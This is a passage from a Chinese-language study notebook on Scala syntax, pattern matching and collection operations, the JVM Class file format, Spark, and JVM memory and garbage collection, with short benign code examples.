    def info() = println(&quot;Car's name is &quot; + name)
}
object Car {
    def apply(name: String):Car = new Car(name) 
    def apply():Car = new Car(&quot;BYD&quot;)
    def main(args: Array[String]): Unit = {
        val car = Car(&quot;BMW&quot;)
        // val car = Car.apply(&quot;BMW&quot;) 是等价的
        car.info()
    }
}
</code></pre>
<ol start="2">
<li>数组下标。记得Scala中的数组下标的写法是<code>()</code>而不是我们熟悉的<code>[]</code>。事实上，我们取下标的操作，是调用<code>class Array</code>实现的<code>apply</code>方法。</li>
</ol>
<pre><code class="language-scala">val list = Array(1, 2, 3, 4, 5)
println(&quot;First is &quot; + list(0))
</code></pre>
<h3 id="update方法"><a class="header" href="#update方法">update方法</a></h3>
<p>往往和下标操作紧密结合。</p>
<pre><code class="language-scala">val list = Array(1, 2, 3, 4, 5)
list(0) = 2
</code></pre>
<p>实际上，<code>list(0) = 114514</code>调用的是<code>list.update(0, 114514)</code>方法。</p>
<h3 id="unapply方法"><a class="header" href="#unapply方法">unapply方法</a></h3>
<p>往往和模式匹配紧密结合，看下面的例子。</p>
<pre><code class="language-scala">class Car(val name: String) {
    def info() = println(&quot;Car's name is &quot; + name)
}

object Car {
    def unapply(car: Car):Option[String] = Some(car.name)
    def main(args: Array[String]): Unit = {
        val car = Car(&quot;BMW&quot;)
        val Car(name) = car;
        println(name)
    }
}
</code></pre>
<p>不难看出这个<code>unapply</code>代码的实现是非常机械的，你可以用IDE自动去生成他，Scala本身也提供了自动生成的方式，样例类。</p>
<h3 id="科里化偏函数"><a class="header" href="#科里化偏函数">科里化，偏函数</a></h3>
<div style="break-before: page; page-break-before: always;"></div><h1 id="函数-5"><a class="header" href="#函数-5">函数</a></h1>
<h2 id="函数就是值"><a class="header" href="#函数就是值">函数就是值</a></h2>
<p>我们一般定义函数，是用<code>def</code></p>
<pre><code class="language-scala">def hello(name: String): String = 
	s&quot;hello $name&quot;
</code></pre>
<p>不过，我们也可以用变量的形式定义一个函数。他也体现了，函数在Scala中不是什么特殊的东西。我们可以像使用变量一样使用函数，比如将他作为参数传递。</p>
<pre><code class="language-scala">val hello: (String) =&gt; String = 
	(name) =&gt; s&quot;hello $name&quot;
</code></pre>
<h2 id="lambda表达式"><a class="header" href="#lambda表达式">lambda表达式</a></h2>
<p>上面是给了函数一个名字<code>hello</code>的，事实上我们完全可以不给他名字，创建一个匿名函数。因为很多时候我们将函数作为参数传递的时候，只用一次，这样写就很方便。这就是lambda表达式</p>
<pre><code class="language-scala">(name: String) =&gt; s&quot;hello $name&quot;
</code></pre>
<p>类比一下Python的lambda表达式</p>
<pre><code class="language-python">lambda name: f&quot;hello {name}&quot;
</code></pre>
<p>有时候，你会看到用<code>_</code>来代表变量。<code>_</code>只能用在变量<strong>只使用一次</strong>的情况。在函数非常简单的时候，这个语法糖很好用。比如上面的匿名函数也可以写成这样</p>
<pre><code class="language-scala">&quot;hello &quot; + (_:String)
</code></pre>
<h2 id="高阶函数"><a class="header" href="#高阶函数">高阶函数</a></h2>
<p>高阶函数，就是把函数作为参数，或者把函数作为返回值的函数。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="模式匹配-1"><a class="header" href="#模式匹配-1">模式匹配</a></h1>
<h2 id="match-case"><a class="header" href="#match-case">match-case</a></h2>
<p>Scala中的模式匹配和Rust中的类似，远比C/Java的switch语句强大，虽然说他们有点像。match语句的格式是<code>选择器 match {可选分支}</code></p>
<p>模式匹配是检查某个<strong>值</strong>（value）是否<strong>匹配</strong>某一个<strong>模式</strong>的机制，<strong>一个成功的匹配同时会将匹配值解构为其组成部分</strong>。它是Java中的<code>switch</code>语句的升级版，同样可以用于替代一系列的 if/else 语句。</p>
<p>这是一个表达式化简的例子。<code>expr</code>将进行模式匹配。</p>
<pre><code class="language-scala">def simplify(expr: Expr): Expr = 
	expr match {
        case UnOp(&quot;-&quot;,UnOp(&quot;-&quot;,e)) =&gt; e  // e是一个变量哦，变量可以匹配任何值并捕获
        case BinOp(&quot;+&quot;,e,Num(0)) =&gt; e
        case BinOp(&quot;*&quot;,e,Num(1)) =&gt; e
        case BinOp(&quot;*&quot;, _, Num(0)) | BinOp(&quot;*&quot;, Num(0), _) =&gt; Num(0); 
        	// _是我们不关心的变量，可以匹配任何值不捕获
        case _ =&gt; expr
    }
</code></pre>
<ul>
<li>模式匹配返回的值类型应该相同，在这里都是<code>Expr</code></li>
<li>一个默认的匹配<code>case _</code>是应该要有的。虽然编译时不会报错（不同于Rust），但是在运行时发现value没有得到匹配是会抛出异常<code>MatchError</code>的。</li>
<li>你会发现这里的模式就是构造函数。用构造函数来匹配案例类（其实是实现了unapply方法的类）。当然我们最容易理解的常量匹配（C语言里的switch）也是可以的。</li>
</ul>
<p>匹配的种类：</p>
<ol>
<li>常量模式、变量模式</li>
<li>构造方法模式</li>
<li>序列模式</li>
<li>元组模式</li>
<li>带类型的模式，但是Scala和Java一样有泛型擦除，运行时不会保存泛型类型信息。</li>
</ol>
<h3 id="模式守卫"><a class="header" href="#模式守卫">模式守卫</a></h3>
<p>可以在模式中加上<code>if</code>。</p>
<h2 id="样例类"><a class="header" href="#样例类">样例类</a></h2>
<p>样例类常用于模式匹配。他会自动帮你实现很多有用的方法。样例类的构造很简单，在类声明前面加上<code>case</code>修饰即可。</p>
<ul>
<li>Classes have an <code>apply</code> method by default which takes care of object construction. 也就是说实例化只需要<code>v1 = Var(&quot;i&quot;)</code>而不需要<code>new</code></li>
<li>When you create a case class with parameters, the parameters are public <code>val</code>s.</li>
<li>自动实现<code>equals</code>方法。并且Instances of case classes are compared by structure and not by reference</li>
<li>自动实现<code>toString</code>和<code>hashCode</code></li>
<li>自动实现<code>copy</code>方法，创建一个实例的浅拷贝。</li>
<li>自动实现<code>unapply</code>方法，方便模式匹配。</li>
</ul>
<h3 id="密封类"><a class="header" href="#密封类">密封类</a></h3>
<p><code>sealed</code></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="容器的函数式操作"><a class="header" href="#容器的函数式操作">容器的函数式操作</a></h1>
<ul>
<li>遍历操作（通用）</li>
<li>映射操作</li>
<li>过滤操作</li>
<li>归约操作</li>
</ul>
<p>这些方法似乎都定义在trait <a href="https://www.scala-lang.org/api/current/scala/collection/IterableOnceOps.html"><code>IterableOnceOps</code></a>中。</p>
<h2 id="遍历操作"><a class="header" href="#遍历操作">遍历操作</a></h2>
<p>Scala遍历容器的标准方法<code>foreach</code></p>
<p>对Map的遍历，遍历会得到元组<code>(key, value)</code></p>
<h2 id="映射操作"><a class="header" href="#映射操作">映射操作</a></h2>
<p>Scala映射容器的方法有<code>map</code>和<code>flatMap</code>。</p>
<p><code>map</code>是一个一对一的映射，而<code>flatMap</code>是一个一对多的映射。</p>
<p>比如，对于一个链表<code>List(&quot;hello world&quot;, &quot;hi world&quot;)</code></p>
<pre><code class="language-scala">l.map(_.toUpperCase)    // List(HELLO WORLD, HI WORLD)
l.flatMap(_.split(' ')) // List(hello, world, hi, world)
</code></pre>
<h2 id="过滤操作"><a class="header" href="#过滤操作">过滤操作</a></h2>
<p>Scala过滤容器的方法有<code>filter</code>和<code>fileterNot</code></p>
<p>比如，对于一个链表<code>List(1,2,3)</code>，过滤其中的偶数</p>
<pre><code class="language-scala">l.filter(_ % 2 == 0)      // List(2)
l.filterNot(_ % 2 == 1)   // List(2)
</code></pre>
<h2 id="规约操作"><a class="header" href="#规约操作">规约操作</a></h2>
<p>Scala规约容器的方法有<code>reduce</code>和<code>fold</code>，他们有点类似但是不太一样。</p>
<p>比如，对于一个链表<code>List(1,2,3)</code>进行求和操作，用<code>reduce</code>和<code>fold</code>分别为</p>
<pre><code class="language-scala">l.reduce(_ + _)   // ((1+2)+3)
l.fold(0)(_ + _)  // (((0+1)+2)+3)
</code></pre>
<p><code>fold</code>是有一个初始值的，而<code>reduce</code>没有。另外，他们都应该用户满足交换律的函数，也就是<code>f(a,b) = f(b,a)</code>，比如这里的加法。虽然说默认情况下<code>reduce</code>和<code>reduceLeft</code>，<code>fold</code>和<code>foldRight</code>采用相同的实现，但是从语义的角度，如果不满足交换律的话，应该考虑我们想要进行的规约顺序，采用其他的规约操作。比如，如果是减法：</p>
<ul>
<li><code>reduceLeft</code>: ((1-2)-3) = -4</li>
<li><code>reduceRight</code>: (1-(2-3)) = 2</li>
<li><code>foldLeft</code>: (((0-1)-2)-3) = -6</li>
<li><code>foldRight</code>: (1-(2-(3-0))) = 2</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="scaladepth"><a class="header" href="#scaladepth">ScalaDepth</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="class文件"><a class="header" href="#class文件">Class文件</a></h1>
<p>作为信息安全的学生，我们需要对ELF文件的格式有着清楚的认识。而Java的Class文件，我们可以认为是Java Virtual Machine上的二进制文件。当然，他们是有区别的，比如：</p>
<ul>
<li>Class文件是一组以8个字节为基础单位的二进制流，一般二进制文件是以1个字节为单位的。</li>
<li>Class文件使用的是Big-Endian，我们熟悉的x86/RISC-V等是Little-Endian的。</li>
</ul>
<p>详细的可以参考<a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html">官方文档</a>，还可以自己用<code>javap</code>（类似objdump至于ELF）工具对Class文件进行解析。</p>
<p>一个典型的class文件分为：MagicNumber，Version，Constant_pool，Access_flag，This_class，Super_class，Interfaces，Fields，Methods 和Attributes这十个部分。</p>
<p>按照C语言的风格，可以这么理解Class文件的结构，<code>u2</code>代表的是2字节的无符号数，可能用<code>u16</code>会更符合C语言选手的习惯。<code>u4</code>就是<code>u32</code>。</p>
<pre><code class="language-c">ClassFile {
    u4             magic;
    u2             minor_version;
    u2             major_version;
    u2             constant_pool_count;
    cp_info        constant_pool[constant_pool_count-1];
    u2             access_flags;
    u2             this_class;
    u2             super_class;
    u2             interfaces_count;
    u2             interfaces[interfaces_count];
    u2             fields_count;
    field_info     fields[fields_count];
    u2             methods_count;
    method_info    methods[methods_count];
    u2             attributes_count;
    attribute_info attributes[attributes_count];
}
</code></pre>
<h3 id="magicnumber--version"><a class="header" href="#magicnumber--version">MagicNumber &amp; Version</a></h3>
<p>每个Class文件的第0-3个字节是MagicNumber， 0xCAFEBABE（咖啡宝贝）注意是大端序的，也就是依次是0xCA,0xFE,0xBA,0xBE。</p>
<p>第4-5字节存储的是Minor Version，次版本号。</p>
<p>第6-7字节存储的是Major Version，主版本号。</p>
<h3 id="constant_pool"><a class="header" href="#constant_pool">Constant_pool</a></h3>
<p>由于常量池中常量的数量是不固定的，所以在常量池的入口需要放置一项<code>u2</code>类型的数据，代表常量池容量计数值（constant pool_count）。所以最大值是65535。不过最多存储65535个常量，因为index是从1开始计数的。</p>
<p>常量池中主要存放两大类常量：字面量（Literal）和符号引用（Symbolic References）。字面量是很好理解的，比如数字、字符串。符号引用则属于编译原理方面的概念。</p>
<p>常量池中的每一项常量，都用不同的结构来具体表示。不过他们的共同点是第一位是u1的tag，代表当前常量属于哪一种类型。见下表</p>
<div class="table-wrapper"><table><thead><tr><th>Constant Kind</th><th>Tag</th><th>Section</th></tr></thead><tbody>
<tr><td><code>CONSTANT_Class</code></td><td>7</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.1">§4.4.1</a></td></tr>
<tr><td><code>CONSTANT_Fieldref</code></td><td>9</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.2">§4.4.2</a></td></tr>
<tr><td><code>CONSTANT_Methodref</code></td><td>10</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.2">§4.4.2</a></td></tr>
<tr><td><code>CONSTANT_InterfaceMethodref</code></td><td>11</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.2">§4.4.2</a></td></tr>
<tr><td><code>CONSTANT_String</code></td><td>8</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.3">§4.4.3</a></td></tr>
<tr><td><code>CONSTANT_Integer</code></td><td>3</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.4">§4.4.4</a></td></tr>
<tr><td><code>CONSTANT_Float</code></td><td>4</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.4">§4.4.4</a></td></tr>
<tr><td><code>CONSTANT_Long</code></td><td>5</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.5">§4.4.5</a></td></tr>
<tr><td><code>CONSTANT_Double</code></td><td>6</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.5">§4.4.5</a></td></tr>
<tr><td><code>CONSTANT_NameAndType</code></td><td>12</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.6">§4.4.6</a></td></tr>
<tr><td><code>CONSTANT_Utf8</code></td><td>1</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.7">§4.4.7</a></td></tr>
<tr><td><code>CONSTANT_MethodHandle</code></td><td>15</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.8">§4.4.8</a></td></tr>
<tr><td><code>CONSTANT_MethodType</code></td><td>16</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.9">§4.4.9</a></td></tr>
<tr><td><code>CONSTANT_Dynamic</code></td><td>17</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.10">§4.4.10</a></td></tr>
<tr><td><code>CONSTANT_InvokeDynamic</code></td><td>18</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.10">§4.4.10</a></td></tr>
<tr><td><code>CONSTANT_Module</code></td><td>19</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.11">§4.4.11</a></td></tr>
<tr><td><code>CONSTANT_Package</code></td><td>20</td><td><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.12">§4.4.12</a></td></tr>
</tbody></table>
</div>
<p>具体每一种CONSTANT以何种方式存储参考后面的链接。这里只举个例子，Class在常量表的存储。第一个u1就是<code>tag</code>，第二个u2是<code>name_index</code>指向的是一个UTF-8的CONSTANT。</p>
<pre><code class="language-c">CONSTANT_Class_info {
    u1 tag;
    u2 name_index;
}
</code></pre>
<h3 id="access_flag"><a class="header" href="#access_flag">Access_flag</a></h3>
<blockquote>
<p>任何一个Class文件都对应着唯一的一个类或接口的定义信息，但是反过来说，类或接口并不一定都得定义在文件里（譬如类或接口也可以动态生成，直接送入类加载器中）。</p>
</blockquote>
<p>常量池结束之后，紧跟的2字节代表access_flag,用来标识一些类或接口层次的访问信息。2字节共有16个标志位可用，不过目前只使用了9个。</p>
<div class="table-wrapper"><table><thead><tr><th>Flag Name</th><th>Value</th><th>Interpretation</th></tr></thead><tbody>
<tr><td><code>ACC_PUBLIC</code></td><td>0x0001</td><td>Declared <code>public</code>; may be accessed from outside its package.</td></tr>
<tr><td><code>ACC_FINAL</code></td><td>0x0010</td><td>Declared <code>final</code>; no subclasses allowed.</td></tr>
<tr><td><code>ACC_SUPER</code></td><td>0x0020</td><td>Treat superclass methods specially when invoked by the <em>invokespecial</em> instruction.</td></tr>
<tr><td><code>ACC_INTERFACE</code></td><td>0x0200</td><td>Is an interface, not a class.</td></tr>
<tr><td><code>ACC_ABSTRACT</code></td><td>0x0400</td><td>Declared <code>abstract</code>; must not be instantiated.</td></tr>
<tr><td><code>ACC_SYNTHETIC</code></td><td>0x1000</td><td>Declared synthetic; not present in the source code.</td></tr>
<tr><td><code>ACC_ANNOTATION</code></td><td>0x2000</td><td>Declared as an annotation interface.</td></tr>
<tr><td><code>ACC_ENUM</code></td><td>0x4000</td><td>Declared as an <code>enum</code> class.</td></tr>
<tr><td><code>ACC_MODULE</code></td><td>0x8000</td><td>Is a module, not a class or interface.</td></tr>
</tbody></table>
</div>
<h2 id="this-class--super-class--interfaces"><a class="header" href="#this-class--super-class--interfaces">this class &amp; super class &amp; interfaces</a></h2>
<p><code>this_class</code>和<code>super_class</code>都是<code>u2</code>类型数据，而<code>interfaces</code>是一组<code>u2</code>类型数据的集合，集合中元素的个数由<code>interfaces_count</code>指定。Class文件中通过这三项数据来<strong>确定类的继承关系</strong>。</p>
<p>存储的<code>u2</code>实际上是常量池里面的index，指向一个<code>CONSTANT_Class_info</code>的类描述符常量。查找过程可以用下面的图来表示</p>
<p><img src="Language/Scala/ScalaDepth/../images/image-20220414202457571.png" alt="image-20220414202457571" /></p>
<h2 id="field"><a class="header" href="#field">field</a></h2>
<p>field_info用于描述接口或者类中声明的变量。Java语言中的“字段”（Field）包括类级变量以及实例级变量，但不包括在方法内部声明的局部变量。我们可以如何修饰一个字段呢？比如作用域（public、private、protected修饰符）、是实例变量还是类变量（static修饰符）、可变性（final）、并发可见性（volatile修饰符，是否强制从主内存读写）、可否被序列化（transient修饰符）、字段数据类型（基本类型、对象、数组）、字段名称。</p>
<pre><code class="language-c">field_info {
    u2             access_flags;
    u2             name_index;
    u2             descriptor_index;
    u2             attributes_count;
    attribute_info attributes[attributes_count];
}
</code></pre>
<p><code>access_flag</code>和类中的<code>access_flag</code>是很像的，不过标识不完全一样，因为修饰字段和修饰类文件，使用的关键词不太一样。</p>
<div class="table-wrapper"><table><thead><tr><th>Flag Name</th><th>Value</th><th>Interpretation</th></tr></thead><tbody>
<tr><td><code>ACC_PUBLIC</code></td><td>0x0001</td><td>Declared <code>public</code>; may be accessed from outside its package.</td></tr>
<tr><td><code>ACC_PRIVATE</code></td><td>0x0002</td><td>Declared <code>private</code>; accessible only within the defining class and other classes belonging to the same nest (<a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-5.html#jvms-5.4.4">§5.4.4</a>).</td></tr>
<tr><td><code>ACC_PROTECTED</code></td><td>0x0004</td><td>Declared <code>protected</code>; may be accessed within subclasses.</td></tr>
<tr><td><code>ACC_STATIC</code></td><td>0x0008</td><td>Declared <code>static</code>.</td></tr>
<tr><td><code>ACC_FINAL</code></td><td>0x0010</td><td>Declared <code>final</code>; never directly assigned to after object construction (JLS §17.5).</td></tr>
<tr><td><code>ACC_VOLATILE</code></td><td>0x0040</td><td>Declared <code>volatile</code>; cannot be cached.</td></tr>
<tr><td><code>ACC_TRANSIENT</code></td><td>0x0080</td><td>Declared <code>transient</code>; not written or read by a persistent object manager.</td></tr>
<tr><td><code>ACC_SYNTHETIC</code></td><td>0x1000</td><td>Declared synthetic; not present in the source code.</td></tr>
<tr><td><code>ACC_ENUM</code></td><td>0x4000</td><td>Declared as an element of an <code>enum</code> class.</td></tr>
</tbody></table>
</div>
<p><code>name_index</code>显然是字段的<em>简单名称</em>，是对UTF-8常量池项的引用。<code>descriptor_index</code>是描述符，也是对UTF-8常量池项的引用。</p>
<p>例如，Java中的<code>int a</code>，<code>a</code>就是简单名称，描述符是<code>I</code>代表基本类型<code>int</code>。描述符可以认为是描述了字段的类型，不过是用UTF-8串来表示的，具体的规范还是参考<a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.3.2">标准文档</a>。</p>
<p>描述符来描述方法的时候，按照先参数列表、后返回值的顺序描述，参数列表按照参数的严格顺序放在一组小括号“()”之内。如方法<code>void inc()</code>的描述符为<code>()V</code>。方法<code>int indexOf(char[]source, int sourceOffset, int sourceCount, char[]target, int targetOffset, int targetCount, int fromIndex)</code>的描述符为<code>([CII[CIII)I</code>。</p>
<p>attributes集合，用于存储一些额外的信息，字段表可以在属性表中附加描述零至多项的额外信息。例如将字段m的声明改为<code>final static int m=123</code>，那就可能会存在一项名称为<code>ConstantValue</code>的属性，其值指向常量<code>123</code>。</p>
<p>字段表集合中不会列出从父类或者父接口中继承而来的字段，但有可能出现原本Java代码之中不存在的字段，譬如在内部类中为了保持对外部类的访问性，编译器就会自动添加指向外部类实例的字段。</p>
<h2 id="methods"><a class="header" href="#methods">Methods</a></h2>
<p>Class文件存储格式中对方法的描述与对字段的描述采用了几乎完全一致的方式，方法表的结构如同字段表一样，依次包括访问标志（access_flags）、名称索引（name_index）、描述符索引（descriptor_index）、属性表集合（attributes）几项。这些数据项目的含义也与字段表中的非常类似，仅在访问标志和属性表集合的可选项中有所区别。</p>
<h2 id="attributes"><a class="header" href="#attributes">Attributes</a></h2>
<p>Attribute是最复杂的表，就是不固定的东西都往这里装。<a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.7"></a></p>
<p>对于每一个属性，它的名称都要从常量池中引用一个CONSTANT_Utf8_info类型的常量来表示，而属性值的结构则是完全自定义的，只需要通过一个u4的长度属性去说明属性值所占用的位数即可。一个符合规则的属性表是下面的结构。具体的属性内容是完全自定义的。</p>
<pre><code>attribute_info {
    u2 attribute_name_index;
    u4 attribute_length;
    u1 info[attribute_length];
}
</code></pre>
<p>比如代码就是存放在这里的。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="scala-in-depth-读书笔记"><a class="header" href="#scala-in-depth-读书笔记">Scala in Depth 读书笔记</a></h1>
<h2 id="1-scala---a-blended-language"><a class="header" href="#1-scala---a-blended-language">1. Scala - a blended language</a></h2>
<p>Scala是混合范式的语言。</p>
<blockquote>
<p>Scala was developed with the premise that you could mix together object orientation, functional programming, and a powerful type system and still keep elegant, succinct code</p>
</blockquote>
<p>关于Functional Programming和Object-oriented Programming的区别，作者有一段精妙的看法：</p>
<blockquote>
<p>Functional programming puts special emphasis on the “verbs” of a program and ways to combine and manipulate them. Object-oriented programming puts special emphasis on “nouns” and attaches verbs to them. </p>
<p>OOP</p>
<pre><code class="language-scala">class Bird;
class Cat {
    ...
    def catch(b: Bird): Unit = ...
    def eat(): Unit = ...
}

val cat = new Cat
val bird = new Bird
cat.catch(bird)
cat.eat()
</code></pre>
<p>FP</p>
<pre><code class="language-scala">trait Cat
trait Bird
trait Catch
trait FullTummy
def catch(hunter: Cat, prey: Bird): Cat with Catch
def eat(consumer: Cat with Catch): Cat with FullTummy
val story = (catch _) andThen (eat _)
story(new Cat, new Bird)
</code></pre>
</blockquote>
<p>Scala中的Implicit conversation，是通过implicit关键词修饰的函数来完成的。</p>
<blockquote>
<p>An implicit conversion is a method, marked implicit, that takes one argument and returns something. </p>
<p>比如<a href="https://www.scala-lang.org/api/current/scala/Int$.html">Object Int中的代码</a>，不过我猜这个实现是编译器实现的。所以看不到源代码。</p>
<pre><code class="language-scala">implicit defint2double(x: Int): Double
implicit defint2long(x: Int): Long
</code></pre>
</blockquote>
<h2 id="2-the-core-rules"><a class="header" href="#2-the-core-rules">2. The core rules</a></h2>
<h2 id="3-modicum-of-style"><a class="header" href="#3-modicum-of-style">3. Modicum of style</a></h2>
<p>这一章讲的是Scala编码规范的一些建议。 </p>
<p>在Scala中是推荐使用驼峰命名的。使用override关键词。</p>
<h2 id="4-utilizing-object-orientation"><a class="header" href="#4-utilizing-object-orientation">4. Utilizing object orientation</a></h2>
<p>In Scala, every value is an object. Even operators are method calls against the class of an object. </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="spark"><a class="header" href="#spark">Spark</a></h1>
<p><img src="Language/Scala/ScalaDepth/../images/image-20220604164508738.png" alt="image-20220604164508738" /></p>
<p><img src="Language/Scala/ScalaDepth/../images/image-20220604165338529.png" alt="image-20220604165338529" /></p>
<p><strong>RDD</strong>(弹性分布式数据集): Spark最核心的数据抽象。Spark会对RDD进行操作。</p>
<p>DAG(有向无环图): 反应RDD之间的依赖关系。</p>
<p>Executor</p>
<p>application</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="深入理解java虚拟机读书笔记"><a class="header" href="#深入理解java虚拟机读书笔记">《深入理解Java虚拟机读书》笔记</a></h1>
<p><img src="Language/Scala/ScalaDepth/../images/image-20220405103120410.png" alt="image-20220405103120410" /></p>
<ul>
<li><strong>程序计数器</strong>，顾名思义类似于硬件的PC，不过每个线程都有自己的PC记录当前执行位置。</li>
<li>“栈”通常就是指这里讲的<strong>虚拟机栈</strong>，或者更多的情况下只是指<strong>虚拟机栈中局部变量表部分</strong>。局部变量表存放了编译期可知的各种Java虚拟机基本数据类型（boolean、byte、char、short、int、 float、long、double）、对象引用（reference类型，它并不等同于对象本身，可能是一个指向对象起始地址的引用指针，也可能是指向一个代表对象的句柄或者其他与此对象相关的位置）和returnAddress 类型（指向了一条字节码指令的地址）</li>
<li><strong>本地方法栈</strong>（Native Method Stacks）与虚拟机栈所发挥的作用是非常相似的，其区别只是虚拟机 栈为虚拟机执行Java方法（也就是字节码）服务，而本地方法栈则是为虚拟机使用到的本地（Native） 方法服务。有的Java虚拟机（譬如Hot-Spot虚拟机）直接就把本地方法栈和虚拟机栈合二为一。</li>
<li><strong>Java堆</strong>（Java Heap）是虚拟机所管理的内存中最大的一块。Java堆是被所有线程共享的一块内存区域，在虚拟机启动时创建。此内存区域的唯一目的就是<strong>存放对象实例</strong>，Java 世界里“几乎”所有的对象实例都在这里分配内存。（规范是所有的对象实例都在这里分配内存，但由于<strong>即时编译技术</strong>的进步，尤其是逃逸分析技术的日渐强大，栈上分配、标量替换优化手段已经导致一些微妙 的变化悄然发生，所以说Java对象实例都分配在堆上也渐渐变得不是那么绝对了）。</li>
<li><strong>方法区</strong>（Method Area）与Java堆一样，是各个线程共享的内存区域，它用于存储已被虚拟机加载的<strong>类型信息、常量、静态变量、即时编译器编译后的代码</strong>缓存等数据。可能会觉得他和data段、text段有点像，但其实是有不同的。《Java虚拟机规范》中把 方法区描述为堆的一个逻辑部分，
<ul>
<li>运行时常量池（Runtime Constant Pool）是方法区的一部分。Class文件中除了有类的版本、字 段、方法、接口等描述信息外，还有一项信息是常量池表（Constant Pool Table），用于存放编译期生 成的各种字面量与符号引用，这部分内容将在类加载后存放到方法区的运行时常量池中</li>
</ul>
</li>
<li><strong>直接内存</strong>（Direct Memory）并不是虚拟机运行时数据区的一部分，也不是《Java虚拟机规范》中 定义的内存区域。但是这部分内存也被频繁地使用，而且也可能导致OutOfMemoryError异常出现。在JDK 1.4中新加入了NIO（New Input/Output）类，引入了一种基于通道（Channel）与缓冲区 （Buffer）的I/O方式，它可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆里面的 DirectByteBuffer对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。</li>
</ul>
<h2 id="垃圾回收"><a class="header" href="#垃圾回收">垃圾回收</a></h2>
<p>引用计数确实是一个简单好用的垃圾回收方法，比如Python虚拟机就使用了这个方法。但是他并不能解决类似循环引用的问题，所以Java虚拟机并不采用这种方法。</p>
<p>当前主流的商用程序语言（Java、C#）的内存管理子系统，都是通过<strong>可达性分析</strong>（Reachability Analysis）算法来判定对象是否存活的。这个算法的基本思路就是通过一系列称为“GC Roots”的根对象作为起始节点集，从这些节点开始，根据引用关系向下搜索，搜索过程所走过的路径称为“引用链”（Reference Chain），如果某个对象到GC Roots间没有任何引用链相连，或者用图论的话来说就是从GC Roots到这个对象不可达时，则证明此对象是不可能再被使用的。</p>
<p>所以GC Root是什么？在Java技术体系里面，固定可作为GC Roots的对象包括以下几种：</p>
<ul>
<li>在虚拟机栈（栈帧中的本地变量表）中引用的对象，譬如各个线程被调用的方法堆栈中使 用到的参数、局部变量、临时变量等。</li>
<li>在方法区中类静态属性引用的对象，譬如Java类的引用类型静态变量。</li>
<li>在方法区中常量引用的对象，譬如字符串常量池（String Table）里的引用。</li>
<li>在本地方法栈中JNI（即通常所说的Native方法）引用的对象。</li>
<li>Java虚拟机内部的引用，如基本数据类型对应的Class对象，一些常驻的异常对象（比如
NullPointExcepiton、OutOfMemoryError）等，还有系统类加载器。</li>
<li>所有被同步锁（synchronized关键字）持有的对象。</li>
<li>反映Java虚拟机内部情况的JMXBean、JVMTI中注册的回调、本地代码缓存等。</li>
</ul>
<p>构想一下垃圾回收具体可以如何实现。先了解分代收集理论：</p>
<ol>
<li>弱分代假说（Weak Generational Hypothesis）：绝大多数对象都是朝生夕灭的</li>
<li>强分代假说（Strong Generational Hypothesis）：熬过越多次垃圾收集过程的对象就越难以消亡</li>
</ol>
<p>所以收集器应该将Java堆分出不同的区域，然后将回收对象根据其年龄（年龄即对象熬过垃圾收集过程的次数），分配到不同的区域储存。显而易见，如果一个区域中大多数对象都是朝生夕灭，难以熬过垃圾收集过程的话，那么把它们集中放在一起，每次回收时只关注如何保留少量存活而不是去标记那些大量将要被回收的对象，就能以较低代价回收到大量的空间；如果剩下的都是难以消亡的对象，那把它们集中放在一块，虚拟机便可以使用较低的频率来回收这个区域，这就同时兼顾了垃圾收集的时间开销和内存的空间有效利用。</p>
<ol>
<li>
<p>标记-清除算法：最简单的方法，就是定时进行可达性分析，对发现的所有垃圾标记，然后进行回收。这个也确实是最早出现也是最基础的垃圾收集算法。但是效率不高，而且容易产生空间碎片化问题。</p>
</li>
<li>
<p>标记-复制算法：半区复制算法：将可用内存按容量划分为大小相等的两块，每次只使用其中的一块。当这一块的内存用完了，就将还存活着的对象复制到另外一块上面，然后再把已使用过的内存空间一次清理掉。这种复制回收算法的代价是将可用内存缩小为了原来的一半，但是确实简单又高效。但其实，经验告诉我们大多数对象很快的就会消亡，所以并不需要按照1：1的比例。</p>
</li>
<li>
